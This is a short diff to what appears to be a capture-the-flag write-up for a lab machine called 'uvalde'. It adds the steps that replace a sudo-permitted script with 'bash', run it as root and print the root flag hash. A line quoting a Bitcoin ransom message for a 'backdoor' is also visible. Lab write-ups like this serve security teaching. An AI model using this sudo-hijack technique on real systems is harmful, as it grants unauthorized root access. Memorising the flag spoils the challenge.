@@ -69,5 +69,11 @@ Pay 0.000047 BTC to 3FZbgi29cpjq2GjdwV8eyHuJJnkLtktZc5 to unlock backdoor.
 matthew@uvalde:~$ cd  /opt/
 matthew@uvalde:/opt$ mv superhack superhack.bak
 matthew@uvalde:/opt$ echo "bash" > superhack
+matthew@uvalde:/opt$ sudo -u root /bin/bash /opt/superhack
+
+root@uvalde:~# cat root.txt
+59ec54537e98a53691f33e81500f56da
 
 ```
+
+
